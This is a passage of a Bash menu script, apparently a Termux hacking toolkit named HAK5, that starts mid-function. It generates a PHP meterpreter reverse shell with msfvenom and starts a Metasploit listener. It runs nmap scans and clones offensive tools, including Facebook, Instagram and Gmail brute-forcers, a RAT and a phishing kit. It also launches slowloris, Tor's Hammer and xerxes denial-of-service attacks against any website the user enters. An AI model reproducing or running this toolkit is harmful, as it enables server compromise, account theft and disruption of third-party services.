        read -p "Enter The Host: " host
        read -p "Enter The Port: " port
        read -p "Enter the Name: " name
        echo -e "$green [~] $yellow Make SheLL..."
        msfvenom -p php/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f raw > $name.php
        clear
        echo -e "$green[$cyan*$green] $green Done $white>>$yellow The SheLL in HAK5 "
        echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
        sleep 5
        msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
}
admin(){
        sleep 3
        clear
        cd .model
        python2 .findadmin.py
        echo -n -e $red"                Enter Any Kay To Exit"
        read Enter 
        sleep 5
        web
}
s_p(){
        clear
        echo -e """                                                                       
                $red   ▄▄▄▄       ▄▄▄▄                     $white ▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄ 
                $red ▄█▀▀▀▀█    ██▀▀▀▀█                    $white ██    ██    ████    ██  ██▀  
                $red ██▄       ██▀        ▄█████▄  ██▄████▄$white ██    ██    ████    ██▄██    
                $red  ▀████▄   ██         ▀ ▄▄▄██  ██▀   ██$white ████████   ██  ██   █████    
                $red      ▀██  ██▄       ▄██▀▀▀██  ██    ██$white ██    ██   ██████   ██  ██▄  
                $red █▄▄▄▄▄█▀   ██▄▄▄▄█  ██▄▄▄███  ██    ██$white ██    ██  ▄██  ██▄  ██   ██▄ 
                $red  ▀▀▀▀▀       ▀▀▀▀    ▀▀▀▀ ▀▀  ▀▀    ▀▀$white ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀"""
        echo
        echo -e $red"        ----------------------------------$yellow}$cyan Nmap $yellow{$red----------------------------------\n"
}
nmap-p(){
        s_p
        echo -e "$red[$cyan 1 $red] $white Check The Ip" ;sleep 0.2
        echo -e "$red[$cyan 2 $red] $white All PC In NetwOrK" ;sleep 0.2
        echo -e "$red[$cyan 3 $red] $white SCan For All Tcp PortS" ;sleep 0.2
        echo -e "$red[$cyan 4 $red] $white Treat all hosts as online" ;sleep 0.2
        echo -e "$red[$cyan 5 $red] $white Only scan specified ports" ;sleep 0.2
        echo -e "$red[$cyan 6 $red] $white Probe open ports to determine service" ;sleep 0.2
        echo -e "$red[$cyan 7 $red] $white Enable IPv6 scanning" ;sleep 0.2
        echo -e "$red[$cyan 8 $red] $white Never do DNS resolution" ;sleep 0.2
        echo -e "$red[$cyan 9 $red] $white Ping SCan" ;sleep 0.2
        echo -e "$red[$cyan 10 $red] $white UDP Scan" ;sleep 0.2
        echo -e "$red[$cyan 11 $red] $white List Scan" ;sleep 0.2
        echo -e "$red[$cyan 12 $red] $white TCP SYN/ACK" ;sleep 0.2
        echo -e "$red[$cyan 13 $red] $white TCP SYN/Connect" ;sleep 0.2
        echo -e "$red[$cyan 14 $red] $white IP protocol scan" ;sleep 0.2
        echo -e "$red[$cyan 15 $red] $white Back" ;sleep 0.2
        echo -e $white
        read -p "[ H_A_K_5 / SCan_HAK ]~# " scan
        if [ $scan = 1  ];then 
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 2 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n\n "
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap  192.168.1.*
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 3 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2 
                echo -e "$green[$red*$green]$cyan Starting.."
                sudo nmap -Pn -sS -sU -T4 -A -v $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 4 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -Pn $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 5 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                read -p "Enter The Port : " port 
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -p $port $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 6 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -sV $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 7 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target (ex:google.com): " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -6 -A  $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 8 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target or web : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -R $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 9 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -Pn -sn $ip
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 10 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -sS -sU $ip 
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 11 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                sudo nmap -sL $ip         
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 12 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                nmap -PS $ip ;echo "Ex>(google.com)"
                echo -e -n "$yellow                         protocol list > " ;read pl ; nmap -PO $pl 
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 13 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                sudo nmap -sM $ip 
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 14 ]; then
                s_p
                echo -e "                $red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
                read -p "Enter Ip or Target : " ip ;sleep 2
                echo -e "$green[$red*$green]$cyan Starting.."
                sudo nmap -sO $ip 
                echo -e -n "$red                        Enter Any key To Exit";read Enter
                nmap-p
        elif [ $scan = 0 ]; then
                clear
                echo -e $green
                figlet "                MOHAMED"
                echo -e "$red++++++++++++++++++++++++++++++++++++++" 
                sleep 0.2
                echo -e "$yellow By : $green MOHAMED $cyan HACKER"
                sleep 0.2
                echo -e "$yellow Telegram $red @HcmohtatefOfficial"
                sleep 0.2
                echo -e "$red++++++++++++++++++++++++++++++++++++++" 
                sleep 2
                rasma
                main
        else :
                nmap-p
        fi
}

TOoLs(){
        clear
        echo -e """
                $red ▄▄▄▄▄▄▄▄    ▄▄▄▄              ▄▄       $green▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄ 
                $red ▀▀▀██▀▀▀   ██▀▀██             ██       $green██    ██    ████    ██  ██▀  
                $red    ██     ██    ██   ▄████▄   ██       $green██    ██    ████    ██▄██    
                $red    ██     ██    ██  ██▀  ▀██  ██       $green████████   ██  ██   █████    
                $red    ██     ██    ██  ██    ██  ██       $green██    ██   ██████   ██  ██▄  
                $red    ██      ██▄▄██   ▀██▄▄██▀  ██▄▄▄▄▄▄ $green██    ██  ▄██  ██▄  ██   ██▄ 
                $red    ▀▀       ▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀▀▀▀ $green▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀ """
                echo -e $red"                ----------------------------------$yellow}$cyan TOoL $yellow{$red------------------------------\n\n"
        sleep 3
        printf "$yellow [ $red 1 $yellow ] $cyan WPSeku \n"
        sleep 0.2
        printf "$yellow [ $red 2 $yellow ] $cyan InjeCtor-SY\n"
        sleep 0.2
        printf "$yellow [ $red 3 $yellow ] $cyan 0xSQLiNJ\n"
        sleep 0.2
        printf "$yellow [ $red 4 $yellow ] $cyan sqlmap\n"
        sleep 0.2
        printf "$yellow [ $red 5 $yellow ] $cyan Xshell\n"
        sleep 0.2
        printf "$yellow [ $red 6 $yellow ] $cyan XAttacker\n"
        sleep 0.2
        printf "$yellow [ $red 7 $yellow ] $cyan OWScan\n"
        sleep 0.2
        printf "$yellow [ $red 8 $yellow ] $cyan Breacher\n"
        sleep 0.2
        printf "$yellow [ $red 9 $yellow ] $cyan Nmap\n"
        sleep 0.2
        printf "$yellow [ $red 10 $yellow ] $cyan TXTool\n"
        sleep 0.2
        printf "$yellow [ $red 11 $yellow ] $cyan A-Rat\n"
        sleep 0.2
        printf "$yellow [ $red 12 $yellow ] $cyan Facebook Brute\n"
        sleep 0.2
        printf "$yellow [ $red 13 $yellow ] $cyan InstaHack\n"
        sleep 0.2
        printf "$yellow [ $red 14 $yellow ] $cyan gmail_attacker\n"
        sleep 0.2
        printf "$yellow [ $red 15 $yellow ] $cyan Hash Buster\n"
        sleep 0.2
        printf "$yellow [ $red 16 $yellow ] $cyan weeman\n"
        sleep 0.2
        printf "$yellow [ $red 17 $yellow ] $cyan wifite\n"
        sleep 0.2
        printf "$yellow [ $red 18 $yellow ] $cyan Sudo\n"
        sleep 0.2
        printf "$yellow [ $red 19 $yellow ] $cyan Ubuntu\n"
        sleep 0.2
        printf "$yellow [ $red 20 $yellow ] $cyan Fedora\n"
        sleep 0.2
        printf "$yellow [ $red 00 $yellow ] $cyan Back\n"
        printf "$white"
        echo
        read -p "[ H_A_K_5 / TOoL ]~# " tool
        if [ $tool = 1 ];then
                clear
                echo -e $red
                figlet "WPSeku"
                cd ~
                git clone https://github.com/m4ll0k/WPSeku.git
                TOoLs
        elif [ $tool = 2 ]; then
                clear                
                echo -e $red
                figlet "InjeCtor-SY"
                cd ~
                git clone https://github.com/omarsalloum/InjeCtor-SY.git
                TOoLs
        elif [ $tool = 3  ]; then
                clear
                echo -e $red
                figlet "0xSQLiNJ"
                cd ~
                git clone https://github.com/0xAbdullah/0xSQLiNJ
                TOoLs
        elif [ $tool = 4 ]; then
                clear
                echo -e $red
                figlet "sqlmap"
                cd ~
                git clone https://github.com/sqlmapproject/sqlmap
                TOoLs
        elif [ $tool = 5 ]; then
                clear
                echo -e $red
                figlet "Xshell"
                cd ~
                git clone clone https://github.com/Ubaii/Xshell
                TOoLs
        elif [ $tool = 6 ]; then
                clear
                figlet "XAttacker"
                cd ~
                git clone https://github.com/Moham3dRiahi/XAttacker
                TOoLs
        elif [ $tool = 7 ]; then
                clear
                echo -e $red
                figlet "OWScan"
                cd ~
                git clone https://github.com/Gameye98/OWScan
                TOoLs
        elif [ $tool = 8 ]; then
                clear
                echo -e $red
                figlet "Breacher"
                cd ~
                git clone https://github.com/UltimateHackers/Breacher
                TOoLs
        elif [ $tool = 9 ]; then
                clear
                echo -e $red
                figlet "Nmap"
                cd ~
                apt update && apt upgrade
                pkg install nmap -y
                TOoLs
        elif [ $tool = 10 ]; then
                clear
                echo -e $red
                figlet "Txtool"
                cd ~
                git clone https://github.com/kuburan/txtool
                TOoLs
        elif [ $tool = 11 ]; then
                clear
                echo -e $red
                figlet "A-RAT"
                cd ~
                git clone https://github.com/Xi4u7/A-Rat
                TOoLs
        elif [ $tool = 12 ]; then
                clear
                echo -e $red
                figlet "Facebook Brute"
                cd ~
                git clone https://github.com/HackerAdana/facebook-brute-force.git
                TOoLs
        elif [ $tool = 13 ]; then
                echo -e $red
                figlet "InstaHack"
                cd ~
                apt update && apt upgrade
                apt install python2 git
                pip2 install requests
                git clone https://github.com/avramit/instahack
                TOoLs
        elif [ $tool = 14 ]; then
                clear
                echo -e $red
                figlet "gmail_attacker"
                cd ~
                git clone https://github.com/AyoubSirai/gmail_attacker.git
                TOoLs
        elif [ $tool = 15 ]; then
                clear
                echo -e $red
                figlet "Hash Buster"
                cd ~
                git clone https://github.com/UltimateHackers/Hash-Buster.git
                TOoLs
        elif [ $tool = 16  ]; then
                clear
                echo -e $red
                figlet "weeman"
                cd ~
                git clone https://github.com/evait-security/weeman.git
                TOoLs
        elif [ $tool = 17 ]; then
                clear
                echo -e $red
                figlet "wifite"
                cd ~
                wget https://raw.github.com/derv82/wifite/master/wifite.py
                TOoLs
        elif [ $tool = 18 ]; then
                clear
                echo -e $reed
                figlet "Sudo"
                cd ~
                git clone https://github.com/st42/termux-sudo
                TOoLs
        elif [ $tool = 19 ]; then
                clear
                echo -e $red
                figlet "Ubuntu"
                cd ~
                git clone https://github.com/Neo-Oli/termux-ubuntu
                TOoLs
        elif [ $tool = 20 ]; then
                clear
                echo -e $red
                figlet "Fedora"
                cd ~
                wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh
                TOoLs
        elif [ $tool = 0 ] || [ $tool = 00 ]; then
                rasma
                main
        else :
                TOoLs
        fi
}
ip(){
        clear
        figlet IP
        echo
        ip=$(ifconfig wlan0 | grep -o 192..........)
        ip2=$(ifconfig eth0 | grep -o 192..........)
        echo -e "                $red The IP UTP $green(Wlan)$yellow>> $cyan $ip\n "
        echo -e "                $red The IP UTP $green(date)$yellow>> $cyan $ip2\n "
        echo -e "                $red The IP TCP $green$yellow>> $cyan $my_ip\n "
        echo -e -n "                        Enter Any key To Exit ";read Enter
        rasma
        main        
}
ddos(){
        clear
        echo -e """

                $red ▄▄▄▄▄   $blue  ▄▄▄▄▄   $cyan    ▄▄▄▄  $white    ▄▄▄▄   
                $red ██▀▀▀██ $blue  ██▀▀▀██ $cyan   ██▀▀██ $white  ▄█▀▀▀▀█  
                $red ██    ██$blue  ██    ██$cyan  ██    ██$white  ██▄      
                $red ██    ██$blue  ██    ██$cyan  ██    ██$white   ▀████▄  
                $red ██    ██$blue  ██    ██$cyan  ██    ██$white       ▀██ 
                $red ██▄▄▄██ $blue  ██▄▄▄██ $cyan   ██▄▄██ $white  █▄▄▄▄▄█▀ 
                 $red ▀▀▀▀▀   $blue  ▀▀▀▀▀   $cyan    ▀▀▀▀  $white   ▀▀▀▀▀   """
        echo -e $red"----------------------------------$yellow}$cyan DDos $yellow{$red------------------------------\n\n"        
        echo -e "$white[$red 1 $white] $green ToR\n" ;sleep 0.2
        echo -e "$white[$red 2 $white] $green slowloris\n"  ;sleep 0.2
        echo -e "$white[$red 3 $white] $green Hammer\n" ;sleep 0.2
        echo -e "$white[$red 4 $white] $green xerxes\n" ;sleep 0.2
        echo -e "$white[$red 0 $white] $green Back\n" ;sleep 0.2
        echo -e $white
        read -p "[ H_A_K_5 / DDos ]~# " ddos
        if [ $ddos = 1 ];then
                clear 
                figlet ToR
                echo -e -n "$blue Do you want run Tor in the Termainl $red($yellow y/n $red) " ;read ToR
                if [ "$ToR" = "y" ] || [ "$ToR" = "Y" ];then
                        clear
                        figlet ToR
                        echo -e "\n$red Firset go To $green[etc/proxychains.conf]"
                        echo -e "$red and edit and choase the $yellow[strict_chain] $white BY:> remove (#) "
                        echo -e -n "$red when you done $yellow[Enter to contnet]" ; read Enter
                        service tor start
                        proxychains firefox
                        bash .model/.tor.sh
                elif [ "$ToR" = "n" ] || [ "$ToR" = "N" ];then
                        ddos
                else :
                        ddos
                fi
        elif [ $ddos = 2 ]; then
                clear
                figlet slowloris
                echo -n -e "$green Enter the Website to Attack :$red " ;read site
                echo -n -e "$green Enter the PortS :$red " ;read port
                echo -n -e "$green Enter the socet :$red " ;read socet
                python3 .model/.slowloris/slowloris.py $site -p $port -s $socet -v -ua
                echo -e -n "$red                         Enter Any key To Exit ";read Enter ; ddos
        elif [ $ddos = 3 ]; then
                clear
                figlet Hammer
                echo -n -e "$green Enter the Website to Attack :$red " ;read site
                echo -n -e "$green Enter the socet :$red " ;read socet
                python2 .model/.torshammer/torshammer.py --tor -t $site -r $socet -T
        elif [ $ddos = 4  ]; then
                clear
                figlet xerxes
                echo -n -e "$green Enter the Website to Attack :$red " ;read site
                cd .model/.xerxes
                ./xerxes $site 80
                echo -e -n "$red                         Enter Any key To Exit ";read Enter ; ddos
        elif [ $ddos = 0 ]; then
                rasma
                main
        else :
                ddos
        fi
}
serve (){
        clear 
        figlet service
        echo 
        echo -e "$green Wating For Starting.. " ;sleep 3
        apachectl
        clear
        figlet service
        echo
        echo -e "$redThe Service Start.."
        termux-open http://localhost:8080
        echo -e -n "$red                                 Enter Any key To Exit " ;read Enter
        rasma
        main
}
exit(){
        clear
        echo -e """                                                                                
                        $cyan ▄▄▄▄▄▄▄▄               ██     ▄▄▄▄▄▄▄▄$white  ▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄  ▄▄▄▄▄▄▄  
                        $cyan ██▀▀▀▀▀▀               ▀▀     ▀▀▀██▀▀▀$white  ██    ██    ████    ██  ██▀   ██▀▀▀▀▀  
                        $cyan ██        ▀██  ██▀   ████        ██   $white  ██    ██    ████    ██▄██     ██▄▄▄▄   
                        $cyan ███████     ████       ██        ██   $white  ████████   ██  ██   █████     █▀▀▀▀██▄ 
                        $cyan ██          ▄██▄       ██        ██   $white  ██    ██   ██████   ██  ██▄         ██ 
                        $cyan ██▄▄▄▄▄▄   ▄█▀▀█▄   ▄▄▄██▄▄▄     ██   $white  ██    ██  ▄██  ██▄  ██   ██▄  █▄▄▄▄██▀ 
                        $cyan ▀▀▀▀▀▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀▀▀▀▀▀     ▀▀   $white  ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀   ▀▀▀▀▀   """

        echo -e "$red++++++++++++++++++++++++++++++++++++++" 
        sleep 0.2
        echo -e "$yellow By : $green MOHAMED $cyan HACKER"
        sleep 0.2
        echo -e "$yellow Telegram $red @HcmohtatefOfficial"
        sleep 0.2
        echo -e "$red++++++++++++++++++++++++++++++++++++++" 

}
main

